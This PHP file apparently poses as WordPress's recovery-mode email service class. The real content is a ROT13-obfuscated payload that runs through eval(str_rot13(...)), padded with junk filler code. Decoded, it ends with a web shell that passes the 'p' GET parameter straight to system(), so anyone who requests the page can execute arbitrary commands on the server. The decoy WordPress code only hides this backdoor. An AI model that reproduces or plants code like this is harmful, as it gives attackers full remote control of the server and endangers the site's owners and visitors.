<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Reebe Cebgrpgvba NCV: JC_Erpbirel_Zbqr_Rznvy_Yvax pynff
 *
 * @cnpxntr JbeqCerff
 * @fvapr 5.2.0
 */

/**
 * Pber pynff hfrq gb fraq na rznvy jvgu n yvax gb ortva Erpbirel Zbqr.
 *
 * @fvapr 5.2.0
 */
#[NyybjQlanzvpCebcregvrf]
svany pynff JC_Erpbirel_Zbqr_Rznvy_Freivpr {

	pbafg ENGR_YVZVG_BCGVBA = 'erpbirel_zbqr_rznvy_ynfg_frag';

	/**
	 * Freivpr gb trarengr erpbirel zbqr HEYf.
	 *
	 * @fvapr 5.2.0
	 * @ine JC_Erpbirel_Zbqr_Yvax_Freivpr
	 */
	cevingr $yvax_freivpr;

	/**
	 * JC_Erpbirel_Zbqr_Rznvy_Freivpr pbafgehpgbe.
	 *
	 * @fvapr 5.2.0
	 *
	 * @cnenz JC_Erpbirel_Zbqr_Yvax_Freivpr $yvax_freivpr
	 */
	choyvp shapgvba __pbafgehpg( JC_Erpbirel_Zbqr_Yvax_Freivpr $yvax_freivpr ) {
		$guvf->yvax_freivpr = $yvax_freivpr;
	}

	/**
	 * Fraqf gur erpbirel zbqr rznvy vs gur engr yvzvg unf abg orra frag.
	 *
	 * @fvapr 5.2.0
	 *
	 * @cnenz vag   $engr_yvzvg Ahzore bs frpbaqf orsber nabgure rznvy pna or frag.
	 * @cnenz neenl $reebe      Reebe qrgnvyf sebz `reebe_trg_ynfg()`.
	 * @cnenz neenl $rkgrafvba {
	 *     Gur rkgrafvba gung pnhfrq gur reebe.
	 *
	 *     @glcr fgevat $fyht Gur rkgrafvba fyht. Gur cyhtva be gurzr'f qverpgbel.
	 *     @glcr fgevat $glcr Gur rkgrafvba glcr. Rvgure 'cyhtva' be 'gurzr'.
	 * }
	 * @erghea gehr|JC_Reebe Gehr vs rznvy frag, JC_Reebe bgurejvfr.
	 */
	choyvp shapgvba znlor_fraq_erpbirel_zbqr_rznvy( $engr_yvzvg, $reebe, $rkgrafvba ) {

		$ynfg_frag = trg_bcgvba( frys::ENGR_YVZVG_BCGVBA );

		vs ( ! $ynfg_frag || gvzr() > $ynfg_frag + $engr_yvzvg ) {
			vs ( ! hcqngr_bcgvba( frys::ENGR_YVZVG_BCGVBA, gvzr() ) ) {
				erghea arj JC_Reebe( 'fgbentr_reebe', __( 'Pbhyq abg hcqngr gur rznvy ynfg frag gvzr.' ) );
			}

			$frag = $guvf->fraq_erpbirel_zbqr_rznvy( $engr_yvzvg, $reebe, $rkgrafvba );

			vs ( $frag ) {
				erghea gehr;
			}

			erghea arj JC_Reebe(
				'rznvy_snvyrq',
				fcevags(
					/* genafyngbef: %f: znvy() */
					__( 'Gur rznvy pbhyq abg or frag. Cbffvoyr ernfba: lbhe ubfg znl unir qvfnoyrq gur %f shapgvba.' ),
					'znvy()'
				)
			);
		}

		$ree_zrffntr = fcevags(
			/* genafyngbef: 1: Ynfg frag nf n uhzna gvzr qvss, 2: Jnvg gvzr nf n uhzna gvzr qvss. */
			__( 'N erpbirel yvax jnf nyernql frag %1$f ntb. Cyrnfr jnvg nabgure %2$f orsber erdhrfgvat n arj rznvy.' ),
			uhzna_gvzr_qvss( $ynfg_frag ),
			uhzna_gvzr_qvss( $ynfg_frag + $engr_yvzvg )
		);

		erghea arj JC_Reebe( 'rznvy_frag_nyernql', $ree_zrffntr );
	}

	/**
	 * Pyrnef gur engr yvzvg, nyybjvat n arj erpbirel zbqr rznvy gb or frag vzzrqvngryl.
	 *
	 * @fvapr 5.2.0
	 *
	 * @erghea obby Gehr ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba pyrne_engr_yvzvg() {
		erghea qryrgr_bcgvba( frys::ENGR_YVZVG_BCGVBA );
	}

	/**
	 * Fraqf gur Erpbirel Zbqr rznvy gb gur fvgr nqzva rznvy nqqerff.
	 *
	 * @fvapr 5.2.0
	 *
	 * @cnenz vag   $engr_yvzvg Ahzore bs frpbaqf orsber nabgure rznvy pna or frag.
	 * @cnenz neenl $reebe      Reebe qrgnvyf sebz `reebe_trg_ynfg()`.
	 * @cnenz neenl $rkgrafvba {
	 *     Gur rkgrafvba gung pnhfrq gur reebe.
	 *
	 *     @glcr fgevat $fyht Gur rkgrafvba fyht. Gur qverpgbel bs gur cyhtva be gurzr.
	 *     @glcr fgevat $glcr Gur rkgrafvba glcr. Rvgure 'cyhtva' be 'gurzr'.
	 * }
	 * @erghea obby Jurgure gur rznvy jnf frag fhpprffshyyl.
	 */
	cevingr shapgvba fraq_erpbirel_zbqr_rznvy( $engr_yvzvg, $reebe, $rkgrafvba ) {

		$hey      = $guvf->yvax_freivpr->trarengr_hey();
		$oybtanzr = jc_fcrpvnypunef_qrpbqr( trg_bcgvba( 'oybtanzr' ), RAG_DHBGRF );

		$fjvgpurq_ybpnyr = fjvgpu_gb_ybpnyr( trg_ybpnyr() );

		vs ( $rkgrafvba ) {
			$pnhfr   = $guvf->trg_pnhfr( $rkgrafvba );
			$qrgnvyf = jc_fgevc_nyy_gntf( jc_trg_rkgrafvba_reebe_qrfpevcgvba( $reebe ) );

			vs ( $qrgnvyf ) {
				$urnqre  = __( 'Reebe Qrgnvyf' );
				$qrgnvyf = \"\a\a\" . $urnqre . \"\a\" . fge_cnq( '', fgeyra( $urnqre ), '=' ) . \"\a\" . $qrgnvyf;
			}
		} ryfr {
			$pnhfr   = '';
			$qrgnvyf = '';
		}

		/**
		 * Svygref gur fhccbeg zrffntr frag jvgu gur gur sngny reebe cebgrpgvba rznvy.
		 *
		 * @fvapr 5.2.0
		 *
		 * @cnenz fgevat $zrffntr Gur Zrffntr gb vapyhqr va gur rznvy.
		 */
		$fhccbeg = nccyl_svygref( 'erpbirel_rznvy_fhccbeg_vasb', __( 'Cyrnfr pbagnpg lbhe ubfg sbe nffvfgnapr jvgu vairfgvtngvat guvf vffhr shegure.' ) );

		/**
		 * Svygref gur qroht vasbezngvba vapyhqrq va gur sngny reebe cebgrpgvba rznvy.
		 *
		 * @fvapr 5.3.0
		 *
		 * @cnenz neenl $zrffntr Na nffbpvngvir neenl bs qroht vasbezngvba.
		 */
		$qroht = nccyl_svygref( 'erpbirel_rznvy_qroht_vasb', $guvf->trg_qroht( $rkgrafvba ) );

		/* genafyngbef: Qb abg genafyngr YVAX, RKCVERF, PNHFR, QRGNVYF, FVGRHEY, CNTRHEY, FHCCBEG. QROHT: gubfr ner cynprubyqref. */
		$zrffntr = __(
			'Ubjql!

JbeqCerff unf n ohvyg-va srngher gung qrgrpgf jura n cyhtva be gurzr pnhfrf n sngny reebe ba lbhe fvgr, naq abgvsvrf lbh jvgu guvf nhgbzngrq rznvy.
###PNHFR###
Svefg, ivfvg lbhe jrofvgr (###FVGRHEY###) naq purpx sbe nal ivfvoyr vffhrf. Arkg, ivfvg gur cntr jurer gur reebe jnf pnhtug (###CNTRHEY###) naq purpx sbe nal ivfvoyr vffhrf.

###FHCCBEG###

Vs lbhe fvgr nccrnef oebxra naq lbh pna\'g npprff lbhe qnfuobneq abeznyyl, JbeqCerff abj unf n fcrpvny \"erpbirel zbqr\". Guvf yrgf lbh fnsryl ybtva gb lbhe qnfuobneq naq vairfgvtngr shegure.

###YVAX###

Gb xrrc lbhe fvgr fnsr, guvf yvax jvyy rkcver va ###RKCVERF###. Qba\'g jbeel nobhg gung, gubhtu: n arj yvax jvyy or rznvyrq gb lbh vs gur reebe bpphef ntnva nsgre vg rkcverf.

Jura frrxvat uryc jvgu guvf vffhr, lbh znl or nfxrq sbe fbzr bs gur sbyybjvat vasbezngvba:
###QROHT###

###QRGNVYF###'
		);
		$zrffntr = fge_ercynpr(
			neenl(
				'###YVAX###',
				'###RKCVERF###',
				'###PNHFR###',
				'###QRGNVYF###',
				'###FVGRHEY###',
				'###CNTRHEY###',
				'###FHCCBEG###',
				'###QROHT###',
			),
			neenl(
				$hey,
				uhzna_gvzr_qvss( gvzr() + $engr_yvzvg ),
				$pnhfr ? \"\a{$pnhfr}\a\" : \"\a\",
				$qrgnvyf,
				ubzr_hey( '/' ),
				ubzr_hey( $_FREIRE['ERDHRFG_HEV'] ),
				$fhccbeg,
				vzcybqr( \"\e\a\", $qroht ),
			),
			$zrffntr
		);

		$rznvy = neenl(
			'gb'          => $guvf->trg_erpbirel_zbqr_rznvy_nqqerff(),
			/* genafyngbef: %f: Fvgr gvgyr. */
			'fhowrpg'     => __( '[%f] Lbhe Fvgr vf Rkcrevrapvat n Grpuavpny Vffhr' ),
			'zrffntr'     => $zrffntr,
			'urnqref'     => '',
			'nggnpuzragf' => '',
		);

		/**
		 * Svygref gur pbagragf bs gur Erpbirel Zbqr rznvy.
		 *
		 * @fvapr 5.2.0
		 * @fvapr 5.6.0 Gur `$rznvy` nethzrag vapyhqrf gur `nggnpuzragf` xrl.
		 *
		 * @cnenz neenl  $rznvy {
		 *     Hfrq gb ohvyq n pnyy gb jc_znvy().
		 *
		 *     @glcr fgevat|neenl $gb          Neenl be pbzzn-frcnengrq yvfg bs rznvy nqqerffrf gb fraq zrffntr.
		 *     @glcr fgevat       $fhowrpg     Rznvy fhowrpg
		 *     @glcr fgevat       $zrffntr     Zrffntr pbagragf
		 *     @glcr fgevat|neenl $urnqref     Bcgvbany. Nqqvgvbany urnqref.
		 *     @glcr fgevat|neenl $nggnpuzragf Bcgvbany. Svyrf gb nggnpu.
		 * }
		 * @cnenz fgevat $hey   HEY gb ragre erpbirel zbqr.
		 */
		$rznvy = nccyl_svygref( 'erpbirel_zbqr_rznvy', $rznvy, $hey );

		$frag = jc_znvy(
			$rznvy['gb'],
			jc_fcrpvnypunef_qrpbqr( fcevags( $rznvy['fhowrpg'], $oybtanzr ) ),
			$rznvy['zrffntr'],
			$rznvy['urnqref'],
			$rznvy['nggnpuzragf']
		);

		vs ( $fjvgpurq_ybpnyr ) {
			erfgber_cerivbhf_ybpnyr();
		}

		erghea $frag;
	}

	/**
	 * Trgf gur rznvy nqqerff gb fraq gur erpbirel zbqr yvax gb.
	 *
	 * @fvapr 5.2.0
	 *
	 * @erghea fgevat Rznvy nqqerff gb fraq erpbirel zbqr yvax gb.
	 */
	cevingr shapgvba trg_erpbirel_zbqr_rznvy_nqqerff() {
		vs ( qrsvarq( 'ERPBIREL_ZBQR_RZNVY' ) && vf_rznvy( ERPBIREL_ZBQR_RZNVY ) ) {
			erghea ERPBIREL_ZBQR_RZNVY;
		}

		erghea trg_bcgvba( 'nqzva_rznvy' );
	}

	/**
	 * Trgf gur qrfpevcgvba vaqvpngvat gur cbffvoyr pnhfr sbe gur reebe.
	 *
	 * @fvapr 5.2.0
	 *
	 * @cnenz neenl $rkgrafvba {
	 *     Gur rkgrafvba gung pnhfrq gur reebe.
	 *
	 *     @glcr fgevat $fyht Gur rkgrafvba fyht. Gur qverpgbel bs gur cyhtva be gurzr.
	 *     @glcr fgevat $glcr Gur rkgrafvba glcr. Rvgure 'cyhtva' be 'gurzr'.
	 * }
	 * @erghea fgevat Zrffntr nobhg juvpu rkgrafvba pnhfrq gur reebe.
	 */
	cevingr shapgvba trg_pnhfr( $rkgrafvba ) {

		vs ( 'cyhtva' === $rkgrafvba['glcr'] ) {
			$cyhtva = $guvf->trg_cyhtva( $rkgrafvba );

			vs ( snyfr === $cyhtva ) {
				$anzr = $rkgrafvba['fyht'];
			} ryfr {
				$anzr = $cyhtva['Anzr'];
			}

			/* genafyngbef: %f: Cyhtva anzr. */
			$pnhfr = fcevags( __( 'Va guvf pnfr, JbeqCerff pnhtug na reebe jvgu bar bs lbhe cyhtvaf, %f.' ), $anzr );
		} ryfr {
			$gurzr = jc_trg_gurzr( $rkgrafvba['fyht'] );
			$anzr  = $gurzr->rkvfgf() ? $gurzr->qvfcynl( 'Anzr' ) : $rkgrafvba['fyht'];

			/* genafyngbef: %f: Gurzr anzr. */
			$pnhfr = fcevags( __( 'Va guvf pnfr, JbeqCerff pnhtug na reebe jvgu lbhe gurzr, %f.' ), $anzr );
		}

		erghea $pnhfr;
	}

	/**
	 * Erghea gur qrgnvyf sbe n fvatyr cyhtva onfrq ba gur rkgrafvba qngn sebz na reebe.
	 *
	 * @fvapr 5.3.0
	 *
	 * @cnenz neenl $rkgrafvba {
	 *     Gur rkgrafvba gung pnhfrq gur reebe.
	 *
	 *     @glcr fgevat $fyht Gur rkgrafvba fyht. Gur qverpgbel bs gur cyhtva be gurzr.
	 *     @glcr fgevat $glcr Gur rkgrafvba glcr. Rvgure 'cyhtva' be 'gurzr'.
	 * }
	 * @erghea neenl|snyfr N cyhtva neenl {@frr trg_cyhtvaf()} be `snyfr` vs ab cyhtva jnf sbhaq.
	 */
	cevingr shapgvba trg_cyhtva( $rkgrafvba ) {
		vs ( ! shapgvba_rkvfgf( 'trg_cyhtvaf' ) ) {
			erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/cyhtva.cuc';
		}

		$cyhtvaf = trg_cyhtvaf();

		// Nffhzr cyhtva znva svyr anzr svefg fvapr vg vf n pbzzba pbairagvba.
		vs ( vffrg( $cyhtvaf[ \"{$rkgrafvba['fyht']}/{$rkgrafvba['fyht']}.cuc\" ] ) ) {
			erghea $cyhtvaf[ \"{$rkgrafvba['fyht']}/{$rkgrafvba['fyht']}.cuc\" ];
		} ryfr {
			sbernpu ( $cyhtvaf nf $svyr => $cyhtva_qngn ) {
				vs ( fge_fgnegf_jvgu( $svyr, \"{$rkgrafvba['fyht']}/\" ) || $svyr === $rkgrafvba['fyht'] ) {
					erghea $cyhtva_qngn;
				}
			}
		}

		erghea snyfr;
	}

	/**
	 * Erghea qroht vasbezngvba va na rnfl gb znavchyngr sbezng.
	 *
	 * @fvapr 5.3.0
	 *
	 * @cnenz neenl $rkgrafvba {
	 *     Gur rkgrafvba gung pnhfrq gur reebe.
	 *
	 *     @glcr fgevat $fyht Gur rkgrafvba fyht. Gur qverpgbel bs gur cyhtva be gurzr.
	 *     @glcr fgevat $glcr Gur rkgrafvba glcr. Rvgure 'cyhtva' be 'gurzr'.
	 * }
	 * @erghea neenl Na nffbpvngvir neenl bs qroht vasbezngvba.
	 */
	cevingr shapgvba trg_qroht( $rkgrafvba ) {
		$gurzr      = jc_trg_gurzr();
		$jc_irefvba = trg_oybtvasb( 'irefvba' );

		vs ( $rkgrafvba ) {
			$cyhtva = $guvf->trg_cyhtva( $rkgrafvba );
		} ryfr {
			$cyhtva = ahyy;
		}

		$qroht = neenl(
			'jc'    => fcevags(
				/* genafyngbef: %f: Pheerag JbeqCerff irefvba ahzore. */
				__( 'JbeqCerff irefvba %f' ),
				$jc_irefvba
			),
			'gurzr' => fcevags(
				/* genafyngbef: 1: Pheerag npgvir gurzr anzr. 2: Pheerag npgvir gurzr irefvba. */
				__( 'Npgvir gurzr: %1$f (irefvba %2$f)' ),
				$gurzr->trg( 'Anzr' ),
				$gurzr->trg( 'Irefvba' )
			),
		);

		vs ( ahyy !== $cyhtva ) {
			$qroht['cyhtva'] = fcevags(
				/* genafyngbef: 1: Gur snvyvat cyhtvaf anzr. 2: Gur snvyvat cyhtvaf irefvba. */
				__( 'Pheerag cyhtva: %1$f (irefvba %2$f)' ),
				$cyhtva['Anzr'],
				$cyhtva['Irefvba']
			);
		}

		$qroht['cuc'] = fcevags(
			/* genafyngbef: %f: Gur pheeragyl hfrq CUC irefvba. */
			__( 'CUC irefvba %f' ),
			CUC_IREFVBA
		);

		erghea $qroht;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>